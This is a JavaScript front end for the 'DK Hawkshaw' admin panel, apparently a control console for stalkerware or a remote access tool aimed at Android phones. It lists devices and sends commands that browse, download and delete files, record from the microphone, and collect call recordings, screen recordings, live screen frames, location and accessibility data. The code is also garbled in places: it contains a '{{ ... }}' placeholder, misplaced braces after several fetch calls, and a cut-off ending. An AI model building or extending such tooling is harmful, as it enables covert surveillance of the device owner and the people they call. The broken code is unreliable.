// Enhanced Admin Panel JavaScript for DK Hawkshaw App
// Supports all command types and expanded functionality

// Socket.IO client is loaded via CDN in the HTML
const io = window.io;

class HawkshawAdmin {
    constructor() {
        this.socket = null;
        this.currentDevice = null;
        this.authToken = localStorage.getItem('hawkshaw_admin_token');
        this.devices = [];
        this.init();
    }

    async init() {
        try {
            this.initSocket();
            this.bindEvents();
            if (this.authToken) {
                this.showMainApp();
                try {
                    await this.loadDashboard();
                } catch (error) {
                    console.error('Failed to load dashboard:', error);
                    this.showAlert('Failed to load dashboard. Please refresh the page.', 'danger');
                }
            }
        } catch (error) {
            console.error('Initialization error:', error);
            this.showAlert('Failed to initialize the application. Please check the console for details.', 'danger');
        }
    }

    initSocket() {
        try {
            this.socket = io({
                reconnection: true,
                reconnectionAttempts: 5,
                reconnectionDelay: 1000
            });
            
            this.socket.on('connect', () => {
                console.log('Connected to server');
                if (this.authToken) {
                    this.socket.emit('join-admin');
                }
            });

            this.socket.on('connect_error', (error) => {
                console.error('Socket connection error:', error);
                this.showAlert('Connection error. Attempting to reconnect...', 'warning');
            });

            // Real-time event handlers
            const eventHandlers = {
                'device-status-changed': (data) => this.updateDeviceStatus(data),
                'new-location': (data) => this.updateLocationData(data),
                'apps-updated': (data) => this.showNotification(`Apps updated for device ${data.device_id}: ${data.count} apps`, 'info'),
                'accessibility-data': (data) => this.showNotification(`New accessibility data from device ${data.device_id}`, 'warning'),
                'device-audio-updated': (data) => this.updateAudioStatus(data),
                'config-updated': (data) => this.showNotification(`Configuration updated for device ${data.device_id}`, 'success'),
                'new-call-recording': (data) => {
                    this.showNotification(`New call recording from ${data.phone_number} on device ${data.device_id}`, 'info');
                    if (this.currentDevice && this.currentDevice.device_id === data.device_id) {
                        this.loadCallRecordings();
                    }
                },
                'screen_recording_uploaded': (data) => {
                    this.showNotification(`New screen recording from device ${data.device_id}`, 'info');
                    if (this.currentDevice && this.currentDevice.device_id === data.device_id) {
                        this.loadScreenRecordings();
                    }
                },
                'screen_recording_updated': (data) => {
                    if (this.currentDevice && this.currentDevice.device_id === data.device_id) {
                        this.loadScreenRecordings();
                    }
                },
                'projection_started': (data) => {
                    this.showNotification(`Screen projection started for device ${data.device_id}`, 'success');
                    this.loadActiveProjections();
                },
                'projection_stopped': (data) => {
                    this.showNotification(`Screen projection stopped for device ${data.device_id}`, 'warning');
                    this.loadActiveProjections();
                },
                'screen_frame': (data) => this.updateScreenFrame(data)
            };

            // Register all event handlers
            Object.entries(eventHandlers).forEach(([event, handler]) => {
                this.socket.on(event, handler);
            });
        } catch (error) {
            console.error('Error initializing socket:', error);
            this.showAlert('Failed to initialize WebSocket connection', 'danger');
        }
    }

    bindEvents() {
        try {
            // Login form
            const loginForm = document.getElementById('loginForm');
            if (loginForm) {
                loginForm.addEventListener('submit', (e) => {
                    e.preventDefault();
                    this.login();
                });
            }

            // Navigation
            document.querySelectorAll('[data-section]').forEach(link => {
                if (link instanceof HTMLElement) {
                    link.addEventListener('click', (e) => {
                        e.preventDefault();
                        const section = link.getAttribute('data-section');
                        if (section) {
                            this.showSection(section);
                        }
                    });
                }
            });

            // Logout
            const logoutBtn = document.getElementById('logoutBtn');
            if (logoutBtn) {
                logoutBtn.addEventListener('click', () => this.logout());
            }

            // Add any other event bindings here
        } catch (error) {
            console.error('Error binding events:', error);
            this.showAlert('Failed to initialize event listeners.', 'danger');
        }
    }

    async login() {
        const username = (document.getElementById('username')?.value || '').trim();
        const password = (document.getElementById('password')?.value || '').trim();

{{ ... }}
        if (!username || !password) {
            this.showAlert('Please enter both username and password', 'danger');
            return;
        }

        try {
            const response = await fetch('/api/auth/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ username, password })
            });

            const data = await response.json();

            if (data.success) {
                this.authToken = data.token;
                localStorage.setItem('hawkshaw_admin_token', this.authToken);
                this.showMainApp();
                try {
                    await this.loadDashboard();
                    this.socket.emit('join-admin');
                } catch (error) {
                    console.error('Failed to load dashboard after login:', error);
                    this.showAlert('Login successful but failed to load dashboard. Please refresh the page.', 'warning');
                }
            } else {
                this.showAlert('Login failed: ' + (data.error || 'Unknown error'), 'danger');
            }
        } catch (error) {
            console.error('Login error:', error);
            this.showAlert('Login error: ' + (error.message || 'Unknown error occurred'), 'danger');
        }
    }

    logout() {
        localStorage.removeItem('hawkshaw_admin_token');
        this.authToken = null;
        document.getElementById('loginScreen').classList.remove('d-none');
        document.getElementById('mainApp').classList.add('d-none');
    }

    showMainApp() {
        const loginScreen = document.getElementById('loginScreen');
        const mainApp = document.getElementById('mainApp');
        
        if (loginScreen) loginScreen.classList.add('d-none');
        if (mainApp) mainApp.classList.remove('d-none');
    }

    showSection(section) {
        // Hide all sections
        document.querySelectorAll('.content-section').forEach(sec => {
            sec.classList.add('d-none');
        });
        
        // Show the selected section
        const sectionElement = document.getElementById(`${section}-section`);
        if (sectionElement) {
            sectionElement.classList.remove('d-none');
        }
        
        // Update active navigation
        document.querySelectorAll('.nav-link').forEach(link => {
            const isActive = link.dataset.section === section;
            link.classList.toggle('active', isActive);
        });
        
        // Load section data if method exists
        if (typeof this.loadSectionData === 'function') {
            this.loadSectionData(section);
        }
    }

    async loadSectionData(section) {
        if (!section) return Promise.resolve();
        
        try {
            switch (section) {
                case 'dashboard':
                    return this.loadDashboard();
                case 'devices':
                    return this.loadDevices();
                case 'apps':
                    return this.loadAppsSection();
                case 'file-explorer':
                    return this.loadFileExplorerSection();
                case 'accessibility':
                    return this.loadAccessibilitySection();
                case 'audio':
                    return this.loadAudioSection();
                case 'config':
                    return this.loadConfigSection();
                case 'commands':
                    return this.loadCommandsSection();
                case 'call-recordings':
                    return this.loadCallRecordingsSection();
                default:
                    console.warn(`No handler for section: ${section}`);
                    return Promise.resolve();
            }
        } catch (error) {
            console.error(`Error loading section ${section}:`, error);
            this.showAlert(`Failed to load section: ${section}`, 'danger');
            return Promise.reject(error);
        }
    }

    async loadDashboard() {
        if (!this.authToken) {
            console.error('No auth token available');
            return Promise.reject(new Error('Not authenticated'));
        }
        
        try {
            const response = await fetch('/api/admin/dashboard', {
                method: 'GET',
                headers: {
                    'Authorization': `Bearer ${this.authToken}`,
                    'Content-Type': 'application/json'
                }
                });


            const data = await response.json();
            if (data.success) {
                this.updateDashboardStats(data.data);
            }
        } catch (error) {
            console.error('Dashboard load error:', error);

    }

    updateDashboardStats(stats) {
        document.getElementById('totalDevices').textContent = stats.total_devices || 0;
        document.getElementById('onlineDevices').textContent = stats.online_devices || 0;
        document.getElementById('totalCommands').textContent = stats.total_commands || 0;
        document.getElementById('pendingCommands').textContent = stats.pending_commands || 0;
    }

    async loadDevices() {
        try {
            if (!this.authToken) {
                throw new Error('Authentication token not found');
            }
            
            const response = await fetch('/api/devices', {
                method: 'GET',
                headers: {
                    'Authorization': `Bearer ${this.authToken}`,
                    'Content-Type': 'application/json'
                }
            });
            
            const data = await response.json();
            if (data.success) {
                this.devices = data.data?.devices || [];
                this.renderDevicesTable();
            } else {
                throw new Error(data.error || 'Failed to load devices');
            }
        } catch (error) {
            console.error('Devices load error:', error);
            this.showAlert(`Failed to load devices: ${error.message}`, 'danger');
        }
    }

    renderDevicesTable() {
        const tbody = document.getElementById('devicesTableBody');
        if (!tbody) return;

        tbody.innerHTML = this.devices.map(device => {
            // Escape HTML to prevent XSS
            const deviceName = device.device_name ? this.escapeHtml(device.device_name) : 'Unknown';
            const deviceId = this.escapeHtml(device.device_id || '');
            const lastSeen = device.last_seen ? new Date(device.last_seen).toLocaleString() : 'Never';
            
            return `
                <tr>
                    <td>${deviceName}</td>
                    <td>${deviceId}</td>
                    <td>
                        <span class="badge ${device.is_online ? 'bg-success' : 'bg-danger'}">
                            ${device.is_online ? 'Online' : 'Offline'}
                        </span>
                    </td>
                    <td>${lastSeen}</td>
                    <td>
                        <div class="btn-group" role="group">
                            <button class="btn btn-sm btn-primary" data-device-id="${deviceId}" data-action="select">
                                Select
                            </button>
                            <button class="btn btn-sm btn-info" data-device-id="${deviceId}" data-action="details">
                                Details
                            </button>
                        </div>
                    </td>
                </tr>
            `;
        }).join('');
        
        // Add event listeners to the buttons
        tbody.querySelectorAll('button[data-device-id]').forEach(button => {
            const deviceId = button.dataset.deviceId;
            const action = button.dataset.action;
            
            button.addEventListener('click', () => {
                if (action === 'select') {
                    this.selectDevice(deviceId);
                } else if (action === 'details') {
                    this.viewDeviceDetails(deviceId);
                }
            });
        });
    }

    selectDevice(deviceId) {
        this.currentDevice = this.devices.find(d => d.id === deviceId);
        if (this.currentDevice) {
            this.showNotification(`Selected device: ${this.currentDevice.device_name}`, 'success');
            this.updateDeviceSelector();
        }
    }

    updateDeviceSelector() {
        const selectors = document.querySelectorAll('.device-selector');
        selectors.forEach(selector => {
            selector.innerHTML = `
                <option value="">Select Device</option>
                ${this.devices.map(device => `
                    <option 
                        value="${device.id}" 
                        ${device.id === this.currentDevice?.id ? 'selected' : ''}
                    >
                        ${device.device_name || device.device_id}
                    </option>
                `).join('')}
            `;
        });
    }

    // Apps Management
    renderAppsTable(apps) {
        const container = document.getElementById('appsTable');
        if (!container) return;

        container.innerHTML = `
            <div class="card">
                <div class="card-header d-flex justify-content-between align-items-center">
                    <h5>Installed Apps (${apps?.length || 0})</h5>
                    <button class="btn btn-primary" id="refreshAppsBtn">
                        <i class="fas fa-sync"></i> Refresh Apps
                    </button>
                </div>
                <div class="card-body">
                    <div class="table-responsive">
                        <table class="table table-striped">
                            <thead>
                                <tr>
                                    <th>App Name</th>
                                    <th>Package</th>
                                    <th>Version</th>
                                    <th>Size</th>
                                    <th>Type</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${apps.map(app => `
                                    <tr>
                                        <td>${app.app_name}</td>
                                        <td><code>${app.package_name}</code></td>
                                        <td>${app.version_name || 'N/A'}</td>
                                        <td>${this.formatBytes(app.app_size)}</td>
                                        <td>
                                            <span class="badge ${app.is_system_app ? 'bg-secondary' : 'bg-primary'}">
                                                ${app.is_system_app ? 'System' : 'User'}
                                            </span>
                                        </td>
                                        <td>
                                            <button class="btn btn-sm btn-success" onclick="hawkshawAdmin.openApp('${app.package_name}')">
                                                <i class="fas fa-play"></i> Open
                                            </button>
                                        </td>
                                    </tr>
                                `).join('')}
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        `;
    }

    async requestAppsList() {
        if (!this.currentDevice) return;

        await this.sendCommand('push_installed_app_list', {});
        this.showNotification('Apps list request sent', 'info');
    }

    async openApp(packageName) {
        if (!this.currentDevice) return;

        await this.sendCommand('open_app', { package_name: packageName });
        this.showNotification(`Open app command sent: ${packageName}`, 'success');
    }

    // File Explorer Management
    async loadFileExplorerSection() {
        if (!this.currentDevice) {
            this.showAlert('Please select a device first', 'warning');
            return;
        }

        const container = document.getElementById('fileExplorerContainer');
        if (!container) return;

        container.innerHTML = `
            <div class="card">
                <div class="card-header">
                    <h5>File Explorer</h5>
                    <div class="input-group mt-2">
                        <input type="text" class="form-control" id="fileExplorerPath" placeholder="/storage/emulated/0" value="/storage/emulated/0">
                        <button class="btn btn-primary" onclick="window.hawkshawAdmin.browseFiles()">
                            <i class="fas fa-folder-open"></i> Browse
                        </button>
                    </div>
                </div>
                <div class="card-body">
                    <div id="fileExplorerContent">
                        <p class="text-muted">Click Browse to explore device files</p>
                    </div>
                </div>
            </div>`;
    }

    async browseFiles() {
        const path = document.getElementById('fileExplorerPath').value;
        if (!this.currentDevice || !path) return;

        try {
            const response = await fetch(`/api/file-explorer/device/${this.currentDevice.id}?path=${encodeURIComponent(path)}`, {
                headers: {
                    'Authorization': `Bearer ${this.authToken}`
                }
            });
            
            const data = await response.json();
            if (data.success) {
                this.renderFileExplorer(data.data.files);
            }
        } catch (error) {
            console.error('File explorer error:', error);
        }
    }

    renderFileExplorer(files) {
        const content = document.getElementById('fileExplorerContent');
        if (!content || !files) return;

        content.innerHTML = `
            <div class="table-responsive">
                <table class="table table-hover">
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th>Type</th>
                            <th>Size</th>
                            <th>Modified</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${files.map(file => `
                            <tr>
                                <td>
                                    <i class="fas ${this.getFileIcon(file.file_type, file.mime_type)}"></i>
                                    ${file.file_name}
                                </td>
                                <td>${file.file_type}</td>
                                <td>${file.file_size ? this.formatBytes(file.file_size) : '-'}</td>
                                <td>${file.last_modified ? new Date(file.last_modified).toLocaleString() : '-'}</td>
                                <td>
                                    ${file.file_type === 'file' ? `
                                        <button class="btn btn-sm btn-primary" onclick="hawkshawAdmin.downloadFile('${file.file_path}')">
                                            <i class="fas fa-download"></i>
                                        </button>
                                        <button class="btn btn-sm btn-danger" onclick="hawkshawAdmin.deleteFile('${file.file_path}')">
                                            <i class="fas fa-trash"></i>
                                        </button>
                                    ` : `
                                        <button class="btn btn-sm btn-info" onclick="hawkshawAdmin.browseDirectory('${file.file_path}')">
                                            <i class="fas fa-folder-open"></i>
                                        </button>
                                    `}
                                </td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            </div>
        `;
    }

    getFileIcon(fileType, mimeType) {
        if (fileType === 'directory') return 'fa-folder text-warning';
        if (mimeType?.startsWith('image/')) return 'fa-image text-success';
        if (mimeType?.startsWith('video/')) return 'fa-video text-info';
        if (mimeType?.startsWith('audio/')) return 'fa-music text-primary';
        if (mimeType?.includes('pdf')) return 'fa-file-pdf text-danger';
        return 'fa-file text-muted';
    }

    async downloadFile(filePath) {
        if (!this.currentDevice) return;

        await this.sendCommand('push_file', { file_paths: [filePath] });
        this.showNotification('File download request sent', 'info');
    }

    async deleteFile(filePath) {
        if (!this.currentDevice) return;
        if (!confirm(`Are you sure you want to delete: ${filePath}?`)) return;

        await this.sendCommand('delete_file', { file_path: filePath });
        this.showNotification('File deletion request sent', 'warning');
    }

    // Audio Management
    async loadAudioSection() {
        if (!this.currentDevice) {
            this.showAlert('Please select a device first', 'warning');
            return Promise.resolve();
        }
        
        const container = document.getElementById('audioContainer');
        if (!container) return Promise.resolve();
        
        try {

        container.innerHTML = `
            <div class="row">
                <div class="col-md-6">
                    <div class="card">
                        <div class="card-header">
                            <h5>Audio Controls</h5>
                        </div>
                        <div class="card-body">
                            <div class="mb-3">
                                <label class="form-label">Ringer Mode</label>
                                <select class="form-select" id="ringerMode">
                                    <option value="normal">Normal</option>
                                    <option value="vibrate">Vibrate</option>
                                    <option value="silent">Silent</option>
                                </select>
                            </div>
                            <div class="mb-3">
                                <label class="form-label">Music Volume: <span id="musicVolumeValue">50</span>%</label>
                                <input type="range" class="form-range" id="musicVolume" min="0" max="100" value="50">
                            </div>
                            <div class="mb-3">
                                <label class="form-label">Ring Volume: <span id="ringVolumeValue">50</span>%</label>
                                <input type="range" class="form-range" id="ringVolume" min="0" max="100" value="50">
                            </div>
                            <button class="btn btn-primary" onclick="hawkshawAdmin.setAudioSettings()">
                                <i class="fas fa-volume-up"></i> Apply Settings
                            </button>
                        </div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="card">
                        <div class="card-header">
                            <h5>Audio Recording</h5>
                        </div>
                        <div class="card-body">
                            <div class="mb-3">
                                <label class="form-label">Duration (seconds)</label>
                                <input type="number" class="form-control" id="recordDuration" value="30" min="1" max="300">
                            </div>
                            <div class="mb-3">
                                <label class="form-label">Quality</label>
                                <select class="form-select" id="recordQuality">
                                    <option value="high">High</option>
                                    <option value="medium">Medium</option>
                                    <option value="low">Low</option>
                                </select>
                            </div>
                            <button class="btn btn-danger" onclick="hawkshawAdmin.recordAudio()">
                                <i class="fas fa-microphone"></i> Start Recording
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `;

        // Bind volume slider events
        ['musicVolume', 'ringVolume'].forEach(id => {
            const slider = document.getElementById(id);
            const valueSpan = document.getElementById(id + 'Value');
            if (slider && valueSpan) {
                slider.addEventListener('input', (e) => {
                    valueSpan.textContent = e.target.value;
                });
            }
        });
    }

    async setAudioSettings() {
        if (!this.currentDevice) return;

        const settings = {
            ringer_mode: document.getElementById('ringerMode').value,
            music_volume: parseInt(document.getElementById('musicVolume').value),
            ring_volume: parseInt(document.getElementById('ringVolume').value)
        };

        await this.sendCommand('set_device_audio', settings);
        this.showNotification('Audio settings command sent', 'success');
    }

    async recordAudio() {
        if (!this.currentDevice) return;

        const settings = {
            duration: parseInt(document.getElementById('recordDuration').value),
            quality: document.getElementById('recordQuality').value
        };

        await this.sendCommand('record_audio', settings);
        this.showNotification('Audio recording command sent', 'info');
    }

    // Command System
    async sendCommand(commandType, commandData = {}) {
        if (!commandType) {
            throw new Error('Command type is required');
        }
        
        if (!this.currentDevice) {
            this.showAlert('Please select a device first', 'warning');
            return Promise.reject(new Error('No device selected'));
        }
        
        if (!this.authToken) {
            throw new Error('Authentication token not found');
        }
        
        try {
            const response = await fetch('/api/commands/send', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${this.authToken}`
                },
                body: JSON.stringify({
                    device_id: this.currentDevice.id,
                    command_type: commandType,
                    command_data: commandData
                })
            });

            const data = await response.json();
            if (data.success) {
                this.showNotification('Command sent successfully', 'success');
                return data;
            } else {
                this.showAlert('Command failed: ' + data.error, 'danger');
                throw new Error(data.error || 'Command failed');
            }
        } catch (error) {
            this.showAlert('Command error: ' + error.message, 'danger');
            throw error; // Re-throw to allow callers to handle the error
        }
    }

    // Utility Functions
    formatBytes(bytes) {
        if (!bytes) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    showNotification(message, type = 'info') {
        // Create toast notification
        const toast = document.createElement('div');
        toast.className = `toast align-items-center text-white bg-${type} border-0`;
        toast.setAttribute('role', 'alert');
        toast.innerHTML = `
            <div class="d-flex">
                <div class="toast-body">${message}</div>
                <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
            </div>
        `;

        // Add to toast container
        let container = document.getElementById('toastContainer');
        if (!container) {
            container = document.createElement('div');
            container.id = 'toastContainer';
            container.className = 'toast-container position-fixed top-0 end-0 p-3';
            document.body.appendChild(container);
        }

        container.appendChild(toast);
        const bsToast = new bootstrap.Toast(toast);
        bsToast.show();

        // Remove after hiding
        toast.addEventListener('hidden.bs.toast', () => {
            toast.remove();
            });
        }
    }

    showAlert(message, type = 'info') {
        const alertDiv = document.createElement('div');
        alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
        alertDiv.innerHTML = `
            ${message}
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        `;

        const container = document.querySelector('.main-content') || document.body;
        container.insertBefore(alertDiv, container.firstChild);

        // Auto-dismiss after 5 seconds
        setTimeout(() => {
            alertDiv.remove();
        }, 5000);
    }

    updateDeviceStatus(data) {
        // Update device status in real-time
        const device = this.devices.find(d => d.device_id === data.device_id);
        if (device) {
            device.is_online = data.is_online;
            device.last_seen = data.last_seen;
            this.renderDevicesTable();
        }
    }

    updateLocationData(data) {
        // Handle real-time location updates
        console.log('Location update:', data);
    }

    updateAudioStatus(data) {
        // Handle real-time audio status updates
        console.log('Audio status update:', data);
    }

    // Call Recordings Management
    async loadCallRecordingsSection() {
        this.updateDeviceSelector();
        
        const container = document.getElementById('callRecordingsContainer');
        if (!container) return;

        if (!this.currentDevice) {
            container.innerHTML = `
                <div class="text-center text-muted py-4">
                    <i class="fas fa-phone fa-3x mb-3"></i>
                    <p>Select a device to view call recordings</p>
                </div>
            `;
            return;
        }

        await this.loadCallRecordings();
    }

    async loadCallRecordings() {
        if (!this.currentDevice) {
            this.showAlert('Please select a device first', 'warning');
            return;
        }

        try {
            // Load statistics
            const statsResponse = await fetch(`/api/call-recordings/stats/device/${this.currentDevice.id}`, {
                headers: {
                    'Authorization': `Bearer ${this.authToken}`
                }
            });

            if (statsResponse.ok) {
                const statsData = await statsResponse.json();
                if (statsData.success) {
                    this.updateCallRecordingStats(statsData.data);
                }
            }

            // Load recordings
            const filters = this.getCallRecordingFilters();
            const queryParams = new URLSearchParams(filters).toString();
            
            const response = await fetch(`/api/call-recordings/device/${this.currentDevice.id}?${queryParams}`, {
                headers: {
                    'Authorization': `Bearer ${this.authToken}`
                }
            });

            const data = await response.json();
            if (data.success) {
                this.renderCallRecordingsTable(data.data.recordings, data.data.pagination);
            } else {
                throw new Error(data.error || 'Failed to load call recordings');
            }
        } catch (error) {
            console.error('Call recordings load error:', error);
            this.showAlert('Failed to load call recordings: ' + error.message, 'danger');
        }
    }

    getCallRecordingFilters() {
        return {
            phone_number: document.getElementById('phoneNumberFilter')?.value || '',
            call_type: document.getElementById('callTypeFilter')?.value || '',
            call_direction: document.getElementById('callDirectionFilter')?.value || '',
            page: 1,
            limit: 50
        };
    }

    updateCallRecordingStats(stats) {
        document.getElementById('totalRecordings').textContent = stats.total_recordings || 0;
        document.getElementById('incomingRecordings').textContent = stats.incoming_recordings || 0;
        document.getElementById('outgoingRecordings').textContent = stats.outgoing_recordings || 0;
        document.getElementById('totalDuration').textContent = this.formatDuration(stats.total_duration || 0);
        document.getElementById('totalStorage').textContent = this.formatBytes(stats.total_file_size || 0);
        document.getElementById('importantRecordings').textContent = stats.important_recordings || 0;
        
        // Show stats section
        document.getElementById('callRecordingStats').style.display = 'block';
    }

    renderCallRecordingsTable(recordings, pagination) {
        const container = document.getElementById('callRecordingsContainer');
        if (!container) return;

        if (recordings.length === 0) {
            container.innerHTML = `
                <div class="text-center text-muted py-4">
                    <i class="fas fa-phone fa-3x mb-3"></i>
                    <p>No call recordings found</p>
                </div>
            `;
            return;
        }

        container.innerHTML = `
            <div class="table-responsive">
                <table class="table table-striped table-hover">
                    <thead>
                        <tr>
                            <th>Phone Number</th>
                            <th>Contact</th>
                            <th>Type</th>
                            <th>Direction</th>
                            <th>Date & Time</th>
                            <th>Duration</th>
                            <th>Size</th>
                            <th>Status</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${recordings.map(recording => `
                            <tr>
                                <td>
                                    <strong>${recording.phone_number}</strong>
                                    ${recording.sim_slot !== null ? `<br><small class="text-muted">SIM ${recording.sim_slot}</small>` : ''}
                                </td>
                                <td>${recording.contact_name || '<em>Unknown</em>'}</td>
                                <td>
                                    <span class="badge ${
                                        recording.call_type === 'incoming' ? 'bg-success' :
                                        recording.call_type === 'outgoing' ? 'bg-primary' :
                                        recording.call_type === 'missed' ? 'bg-warning' : 'bg-secondary'
                                    }">
                                        ${recording.call_type}
                                    </span>
                                </td>
                                <td>
                                    <i class="fas ${
                                        recording.call_direction === 'inbound' ? 'fa-arrow-down text-success' : 'fa-arrow-up text-primary'
                                    }"></i>
                                    ${recording.call_direction}
                                </td>
                                <td>
                                    ${new Date(recording.call_start_time).toLocaleString()}
                                    ${recording.network_type ? `<br><small class="text-muted">${recording.network_type}</small>` : ''}
                                </td>
                                <td>
                                    <strong>${this.formatDuration(recording.call_duration)}</strong>
                                    ${recording.recording_duration ? `<br><small class="text-muted">Rec: ${this.formatDuration(recording.recording_duration)}</small>` : ''}
                                </td>
                                <td>${this.formatBytes(recording.recording_file_size)}</td>
                                <td>
                                    <span class="badge ${
                                        recording.processing_status === 'completed' ? 'bg-success' :
                                        recording.processing_status === 'processing' ? 'bg-warning' :
                                        recording.processing_status === 'failed' ? 'bg-danger' : 'bg-secondary'
                                    }">
                                        ${recording.processing_status}
                                    </span>
                                    ${recording.is_important ? '<br><i class="fas fa-star text-warning" title="Important"></i>' : ''}
                                </td>
                                <td>
                                    <div class="btn-group" role="group">
                                        <button class="btn btn-sm btn-primary" onclick="hawkshawAdmin.downloadCallRecording('${recording.id}')" title="Download">
                                            <i class="fas fa-download"></i>
                                        </button>
                                        <button class="btn btn-sm btn-info" onclick="hawkshawAdmin.viewCallRecordingDetails('${recording.id}')" title="Details">
                                            <i class="fas fa-eye"></i>
                                        </button>
                                        <button class="btn btn-sm ${recording.is_important ? 'btn-warning' : 'btn-outline-warning'}" onclick="hawkshawAdmin.toggleImportantRecording('${recording.id}', ${!recording.is_important})" title="${recording.is_important ? 'Remove from Important' : 'Mark as Important'}">
                                            <i class="fas fa-star"></i>
                                        </button>
                                        <button class="btn btn-sm btn-danger" onclick="hawkshawAdmin.deleteCallRecording('${recording.id}')" title="Delete">
                                            <i class="fas fa-trash"></i>
                                        </button>
                                    </div>
                                </td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            </div>
            
            <!-- Pagination -->
            ${pagination.total_pages > 1 ? `
                <nav aria-label="Call recordings pagination">
                    <ul class="pagination justify-content-center">
                        <li class="page-item ${pagination.current_page === 1 ? 'disabled' : ''}">
                            <a class="page-link" href="#" onclick="hawkshawAdmin.loadCallRecordingsPage(${pagination.current_page - 1})">
                                Previous
                            </a>
                        </li>
                        ${Array.from({length: Math.min(5, pagination.total_pages)}, (_, i) => {
                            const page = i + 1;
                            return `
                                <li class="page-item ${pagination.current_page === page ? 'active' : ''}">
                                    <a class="page-link" href="#" onclick="hawkshawAdmin.loadCallRecordingsPage(${page})">
                                        ${page}
                                    </a>
                                </li>
                            `;
                        }).join('')}
                        <li class="page-item ${pagination.current_page === pagination.total_pages ? 'disabled' : ''}">
                            <a class="page-link" href="#" onclick="hawkshawAdmin.loadCallRecordingsPage(${pagination.current_page + 1})">
                                Next
                            </a>
                        </li>
                    </ul>
                </nav>
            ` : ''}
        `;
    }

    async downloadCallRecording(recordingId) {
        try {
            const response = await fetch(`/api/call-recordings/download/${recordingId}`, {
                headers: {
                    'Authorization': `Bearer ${this.authToken}`
                }
                });
        }

            if (response.ok) {
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = response.headers.get('Content-Disposition')?.split('filename=')[1]?.replace(/"/g, '') || 'call_recording.mp3';
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
                
                this.showNotification('Call recording download started', 'success');
            } else {
                this.showAlert('Failed to download recording', 'danger');
            }
        } catch (error) {
            console.error('Download error:', error);
            this.showAlert('Download error: ' + error.message, 'danger');
        }
    }

    async toggleImportantRecording(recordingId, isImportant) {
        try {
            const response = await fetch(`/api/call-recordings/${recordingId}`, {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${this.authToken}`
                },
                body: JSON.stringify({ is_important: isImportant })
                });
        }

            const data = await response.json();
            if (data.success) {
                this.showNotification(`Recording ${isImportant ? 'marked as important' : 'removed from important'}`, 'success');
                this.loadCallRecordings();
            } else {
                this.showAlert('Failed to update recording', 'danger');
            }
        } catch (error) {
            console.error('Toggle important error:', error);
            this.showAlert('Update error: ' + error.message, 'danger');
        }
    }

    async deleteCallRecording(recordingId) {
        if (!confirm('Are you sure you want to delete this call recording? This action cannot be undone.')) {
            return;
        }

        try {
            const response = await fetch(`/api/call-recordings/${recordingId}`, {
                method: 'DELETE',
                headers: {
                    'Authorization': `Bearer ${this.authToken}`
                }
                });
        }

            const data = await response.json();
            if (data.success) {
                this.showNotification('Call recording deleted successfully', 'success');
                await this.loadCallRecordings();
            } else {
                this.showAlert('Failed to delete recording', 'danger');
            }
        } catch (error) {
            console.error('Delete error:', error);
            this.showAlert('Delete error: ' + error.message, 'danger');
        }
    }

    viewCallRecordingDetails(recordingId) {
        // TODO: Implement modal with detailed recording information
        this.showNotification('Recording details view - Coming soon!', 'info');
    }

    filterCallRecordings() {
        this.loadCallRecordings();
    }

    // Screen Recording Methods
    async loadScreenRecordings() {
        if (!this.currentDevice) return;

        try {
            const response = await fetch(`/api/screen-recording/device/${this.currentDevice.device_id}`, {
                headers: {
                    'Authorization': `Bearer ${this.authToken}`
                }
                });
        }

            const data = await response.json();
            if (data.success) {
                this.displayScreenRecordings(data.data);
                this.updateScreenRecordingStats();
            }
        } catch (error) {
            console.error('Error loading screen recordings:', error);
        }
    }

    displayScreenRecordings(recordings) {
        const container = document.getElementById('screenRecordingsContainer');
        if (!container) return;

        if (recordings.length === 0) {
            container.innerHTML = `
                <div class="text-center text-muted py-4">
                    <i class="fas fa-video fa-3x mb-3"></i>
                    <p>No screen recordings found for this device</p>
                </div>
            `;
            return;
        }

        container.innerHTML = `
            <div class="table-responsive">
                <table class="table table-striped">
                    <thead>
                        <tr>
                            <th>Recording ID</th>
                            <th>Duration</th>
                            <th>Resolution</th>
                            <th>Quality</th>
                            <th>Size</th>
                            <th>Status</th>
                            <th>Date</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${recordings.map(recording => `
                            <tr>
                                <td><code>${recording.recording_id}</code></td>
                                <td>${recording.duration ? this.formatDuration(recording.duration) : 'N/A'}</td>
                                <td>${recording.resolution || 'N/A'}</td>
                                <td><span class="badge bg-${this.getQualityColor(recording.quality)}">${recording.quality}</span></td>
                                <td>${this.formatFileSize(recording.file_size)}</td>
                                <td><span class="badge bg-${this.getStatusColor(recording.status)}">${recording.status}</span></td>
                                <td>${new Date(recording.start_time).toLocaleString()}</td>
                                <td>
                                    <div class="btn-group btn-group-sm">
                                        <button class="btn btn-outline-primary" onclick="hawkshawAdmin.downloadScreenRecording(${recording.id})" title="Download">
                                            <i class="fas fa-download"></i>
                                        </button>
                                        <button class="btn btn-outline-danger" onclick="hawkshawAdmin.deleteScreenRecording(${recording.id})" title="Delete">
                                            <i class="fas fa-trash"></i>
                                        </button>
                                    </div>
                                </td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            </div>
        `;
    }

    async updateScreenRecordingStats() {
        try {
            const response = await fetch('/api/screen-recording/stats', {
                headers: {
